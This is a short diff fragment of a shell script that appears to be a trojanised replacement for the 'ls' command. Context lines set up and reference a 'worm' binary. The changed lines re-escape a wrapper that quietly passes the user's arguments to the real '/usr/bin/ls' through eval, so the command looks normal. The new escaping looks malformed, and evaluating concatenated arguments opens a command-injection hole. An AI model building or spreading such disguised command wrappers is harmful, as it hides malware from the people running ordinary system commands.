@@ -27,11 +27,11 @@ chmod +x worm
 # ./worm
 
 # call the original ls
-cmd="/usr/bin/ls"
-for arg in "$@" 
+cmd="\"/usr/bin/ls"\"
+for arg in "\"\$\@"\" 
 do
-    cmd="$cmd $arg"
+    cmd="\"\$cmd \$arg"\"
 done
-eval $cmd
+eval \$cmd
 # rm -f worm
 exit 0
